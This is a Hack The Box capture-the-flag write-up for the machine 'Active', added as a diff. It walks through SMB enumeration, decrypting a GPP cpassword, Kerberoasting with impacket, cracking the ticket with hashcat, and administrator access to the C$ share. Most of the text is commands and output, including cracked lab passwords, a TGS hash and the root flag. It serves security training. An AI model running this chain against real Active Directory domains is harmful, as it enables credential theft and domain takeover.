@@ -1,0 +1,188 @@
+HTB: Active
+
+----------------------------Nmap Scan------------------------------
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152-49158,49169,49170,49179 --min-rate 5000 10.10.10.100  
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-10 06:26 EDT
+Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 65.00% done; ETC: 06:27 (0:00:19 remaining)
+Nmap scan report for 10.10.10.100
+Host is up (0.060s latency).
+
+PORT      STATE  SERVICE       VERSION
+53/tcp    open   domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-10 10:26:59Z)
+135/tcp   open   msrpc         Microsoft Windows RPC
+139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open   microsoft-ds?
+464/tcp   open   kpasswd5?
+593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open   tcpwrapped
+3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open   tcpwrapped
+5722/tcp  open   msrpc         Microsoft Windows RPC
+9389/tcp  open   mc-nmf        .NET Message Framing
+47001/tcp closed winrm
+49152/tcp open   msrpc         Microsoft Windows RPC
+49153/tcp open   msrpc         Microsoft Windows RPC
+49154/tcp open   msrpc         Microsoft Windows RPC
+49155/tcp open   msrpc         Microsoft Windows RPC
+49156/tcp closed unknown
+49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open   msrpc         Microsoft Windows RPC
+49169/tcp closed unknown
+49170/tcp open   msrpc         Microsoft Windows RPC
+49179/tcp closed unknown
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2022-09-10T10:27:57
+|_  start_date: 2022-09-10T10:25:22
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 70.37 seconds
+
+
+----------------------SMB Enumeration-------------------------------
+
+Lisiting the available shares.
+This is a a windows machine afterall.
+
+┌──(kali㉿kali)-[~]
+└─$ smbclient -L \\\\10.10.10.100\\                                                                                                            
+Password for [WORKGROUP\kali]:
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Replication     Disk      
+        SYSVOL          Disk      Logon server share 
+        Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+The Replication share is accessible without need a password.
+
+Inside the Groups directory there is a file called "Groups.xml".
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml 
+
+Groups.xml:
+
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
+    <Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
+  </User>
+</Groups>
+
+*This is an interesting file because whenever a new Group Policy Preference(GPP) is created, there's aan xml file created in theSYSVOL share. Inside the xml file will be configuration data and sensitive information such as any passwords associated with the GPP. Microsoft AES encrypts the password before it's stored as cpassword. Microsoft also happened to publish the encryption key on MSDN. Which can be seen here---> https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN
+
+
+-------------Decrypting The Key with gpp-decrypt-------------------
+
+──(kali㉿kali)-[~]
+└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ                          
+     ------> GPPstillStandingStrong2k18
+
+
+-------------Accessing More Shares------------------------
+
+The most interesting directory that we can connect to is the User share. We find it coreelates to the C:\users\ directory!
+
+(kali㉿kali)-[~]
+└─$ smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                  DR        0  Sat Jul 21 10:39:20 2018
+  ..                                 DR        0  Sat Jul 21 10:39:20 2018
+  Administrator                       D        0  Mon Jul 16 06:14:21 2018
+  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
+  Default                           DHR        0  Tue Jul 14 02:38:21 2009
+  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
+  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
+  Public                             DR        0  Tue Jul 14 00:57:55 2009
+  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018
+
+                5217023 blocks of size 4096. 284487 blocks available
+
+-------Grabbing user.txt---------
+
+smb: \Users\> cd SVC_TGS\
+smb: \Users\SVC_TGS\> cd Desktop\
+smb: \Users\SVC_TGS\Desktop\> get user.txt 
+getting file \Users\SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+
+---------------Kerberos:Kerberoasting------------------
+
+Kerberos is a computer network security protocol that authenticates service requests between two or more trusted hosts across an untrusted network, like the internet. It uses secret-key cryptography and a trusted third party for authenticating client-server applications and verifying users' identities. Check out more here---------> https://www.simplilearn.com/what-is-kerberos-article
+
+Kerberoasting is an attack that abuses the Kerberos protocol to harvest password hashes for Active Directory user accounts with servicePrincipalName (SPN) values — i.e., service accounts.
+A user is allowed to request a ticket-granting service (TGS) ticket for any SPN, and parts of the TGS may be encrypted with RC4 using the password hash of the service account that is assigned the requested SPN as the key. Therefore, an adversary who is able to steal TGS tickets (either from memory or by capturing them by sniffing network traffic) can extract the service account’s password hash and attempt an offline brute force attack to obtain the plaintext password. Check out more here--------> https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html
+
+-----Grabbing The Hash-----
+
+Using they python script GetUserSPNs from impacket on our kali machine, we can get a list of service usernames associated with user account and a ticket which we can use bruteforcing on to get a user's password.
+
+(kali㉿kali)-[~]
+└─$ GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
+
+Password:
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
+--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40  2022-09-10 06:26:34
+
+(kali㉿kali)-[~]
+└─$ cat GetUserSPNs.out 
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$9c67f7f602ec115016b2058781e59e58$e134f8ffdd058672f9e2a1e8807ef779783fce25a3ad90f2301adf38ab1ccc8f3f1395c267c9035c5c6f9ba690c280baaf64907282c7f6589390219f3b8b380df2f83a00f7a75023e27b9c5d54a3bc3375dee42ac129870b5ba0b3d11d9a8ea3d3e787304caa01d2fbb507e860cdd41ddd002203b7ea1b5bd5fe9482c79ced88f537b6a9de8176f88d89fb2d0b9a3c46285567c72f20d9bb61ec1871a7ac66281d9cfacf4b93995870321113f76b328ff70399e0da897fd76f53c5d2ddd17947cf58dde6fe8d8a59f1dc91f27e11c7a8492fe575437fb97f08bf84edcfffacda6a70e218dc53dd51f6f0b8cd677bedf35a6251d7e1971b600d53ca696170cdd2c30480b3494d2311a6cc533f2225cb8f602b92b83f914d0e07d545e8b5e81a40dd953c81b46ac5b31903a744b13f2add6cd262c51ecbd2e8e970585bdaf18a308df0b35df6938fb510e79fb78a211be78e1e00499938dee732f07717cd763adc85c588aa99022f330c59f1c5ff42b6530dba1b1583785fdc2ae2147e9301aec47e7a4128fade66ea96cb45f6c706c3dfe299d53f7be05448d0da71e6e2cae8cbaff867ff4d9f43bac4f3fb1fb45bc458e9927bb8671574b17b4eaf6c632d6da601c48181c320f3c0215c9479f532a1de7049c924d471c1b0fcc73fe17b7cd710dbe15a360a8f04072abfb4f8fc38baad03149ffa94f3fbe1b8daf72879dfaae9fee183427e010da4e36690c2228eb4bba589dae9c29fdcefad95be634ff7e4fa73795d59949a79cf3d8d3d5821fd8d611df8de9e5059f741371716ba84c20ec49ee7da631acb268eb42ec0c216e1759983a7d43946785aff71ba54930c4dfbf1c3d5ee7a3613acdd2eaba92dfb913da6868d430d9548f5186534d92e559708bd90e78c0f0b33adaf8563dbcf09db379edf2434745a136663d2876eadd4713b748b7172d84b1a7fcdbe8b08a657ba820e7dcc5693f73a0a8413d74cd02cc985070c08253b47eba4a3b51c50064bedea9d45d3f538c5a57069a6330d58d73e364f13d586e3c62a0112e8ae0e2a4876ae08bcaf61e719a22fb53b69159319fd851a9963d56e3253fadf04e81a49f7a8fdc5719df8ec88516ba72ff1ca43c2ad2556e17e91be72164fab7bbdc854c5394d960a6e8d47ef477c4b63c7fa12a9685de4985667e615962d99c274ae5b79c7c8517656b1a7fdca602e46ec874e55e185b30aa27b7e687a06ac5bbfe21e784a5dce8dc0d3b04cdc2cd8bde3
+
+---------------Decrypting The Ticket with Hashcat-----------------
+
+(kali㉿kali)-[~]
+└─$ hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
+hashcat (v6.2.5) starting
+
+8dc0d3b04cdc2cd8bde3:Ticketmaster1968
+
+
+---------------Authenticating as Administrator--------------------
+
+(kali㉿kali)-[~]
+└─$ smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968
+Try "help" to get a list of possible commands.
+smb: \> ls
+  $Recycle.Bin                      DHS        0  Mon Jul 13 22:34:39 2009
+  Documents and Settings          DHSrn        0  Tue Jul 14 01:06:44 2009
+  pagefile.sys                      AHS 5041643520  Sat Sep 10 06:25:10 2022
+  PerfLogs                            D        0  Mon Jul 13 23:20:08 2009
+  Program Files                      DR        0  Wed Jan 12 08:11:58 2022
+  Program Files (x86)                DR        0  Thu Jan 21 11:49:16 2021
+  ProgramData                       DHn        0  Wed Jan 12 08:09:27 2022
+  Recovery                         DHSn        0  Mon Jul 16 06:13:22 2018
+  System Volume Information         DHS        0  Wed Jul 18 14:45:01 2018
+  Users                              DR        0  Sat Jul 21 10:39:20 2018
+  Windows                             D        0  Sat Sep 10 07:13:46 2022
+
+                5217023 blocks of size 4096. 279500 blocks available
+
+--------Grabbing root.txt----------
+smb: \> cd Users\Administrator\Desktop\
+smb: \Users\Administrator\Desktop\> get root.txt 
+getting file \Users\Administrator\Desktop\root.txt of size 34 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+$ cat root.txt     
+6c7dfa60fcde9d3a5bb04382232d49cf
